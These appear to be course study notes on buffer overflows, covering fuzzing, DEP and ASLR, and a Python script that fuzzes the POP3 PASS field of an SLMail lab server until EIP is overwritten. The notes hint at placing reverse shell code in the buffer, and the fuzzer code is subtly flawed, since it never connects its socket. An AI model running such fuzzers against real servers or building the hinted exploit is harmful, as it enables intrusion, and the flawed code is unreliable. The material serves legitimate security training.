# Buffer Overflows

There are three main ways of identifying flaws in applications.
  - If the source code of the application is available, then source code review is probably the easiest way to identify bugs.
  - If the application is closed source, you can use reverse engineering techniques, or fuzzing, to find bugs.

## Fuzzing

  - Fuzzing involves sending malformed data into application input and watching for unexpected crashes.
  - An unexpected crash indicates that the application might not filter certain input correctly. This could lead to discovering an exploitable vulnerability.

#### A Word About DEP and ASLR

  - __DEP__ (Data Execution Prevention) is a set of hardware, and software, technologies that perform additional checks on memory, to help prevent malicious code from running on a system.
  - The primary benefit of __DEP__ is to help prevent code execution from data pages, by raising an exception, when execution occurs.
  - __ASLR__ (Address Space Layout Randomization) randomizes the base addresses of loaded applications, and DLLs, every time the Operating System is booted.
#### Interacting with the POP3 Protocol

  > if the protocol under examination was unknown to us, we would either need to look up the RFC of the protocol format, or learn it ourselves, using a tool like Wireshark.

  - To reproduce the netcat connection usage performed earlier in the course using a Python script, our code would look similar to the following

    ```python
    #!/usr/bin/python
    import socket
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
      print "\nSending vil buffer..."
      s.connect(('10.0.0.22',110))     #connect to IP, POP3 port
      data = s.recv(1024)     # receive banner
      print data     # print banner

      s.send('USER   test' +'\r\n')     # end username "test"
      data = s.recv(1024)     # receive reply
      print data     # print reply

      s.send('PASS test\r\n')     # send password "test"
      data = s.recv(1024)     # receive reply
      print data     # print reply

      s.close()     # close socket
      print "\nDone!"

    except:
      print "Could not connect to POP3!”
    ```

  - Taking this simple script and modifying it to fuzz the password field during the login process is easy. The resulting script would look like the following.

    ```python
    #!/usr/bin/python
    import socket

    # Create an array of buffers, from 10 to 2000, with increments of 20.
    buffer=["A"]
    counter=100

    while len(buffer) <= 30:
      buffer.append("A"*counter)
      counter=counter+200

    for string in buffer:
      print "Fuzzing PASS with %s bytes" %len(string)
      s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
      s.recv(1024)
      s.send('USER test\r\n')
      s.recv(1024)
      s.send('PASS ' + string + '\r\n')
      s.send('QUIT\r\n')
      s.close()
    ```
    - Run this script against your SLMail instance, while attached to __Immunity Debugger__.
    - The results of running this script shows that the __Extended Instruction Pointer (EIP)__ register has been overwritten with our input buffer of A’s (the hex equivalent of the letter A is \x41).
    - This is of particular interest to us, as the EIP register also controls the execution flow of the application.
    - This means that if we craft our exploit buffer carefully, we might be able to divert the execution of the program to a place of our choosing, such as a into the memory where we can introduce some reverse shell code, as part of our buffer.
![Execution Halted in OllyDbg](/images/33.png)
